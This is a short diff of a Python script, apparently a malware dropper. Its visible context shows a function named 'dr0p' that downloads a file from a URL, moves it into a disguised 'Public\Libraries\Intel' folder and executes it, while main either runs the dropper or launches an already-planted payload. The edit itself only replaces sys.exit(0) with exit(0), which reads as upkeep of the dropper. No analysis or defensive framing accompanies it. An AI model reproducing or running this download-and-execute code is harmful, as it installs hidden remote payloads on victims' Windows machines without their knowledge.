@@ -11,14 +11,14 @@ def dr0p():
     urlretrieve(url_d,nameem)
     move(nameem, "C:\\Users\\Public\\Libraries\\Intel\\" + nameem)
     os.popen("C:\\Users\\Public\\Libraries\\Intel\\" + nameem)
-    sys.exit(0)
+    exit(0)
 def main():    
     if os.path.isfile(dir) == False:
         dr0p()
-        sys.exit(0)
+        exit(0)
     else:
         os.popen('C:\\Users\\Public\\Libraries\\Intel\\' + nameph)
-        sys.exit(0)
+        exit(0)
 
 if __name__ == '__main__':
     main()
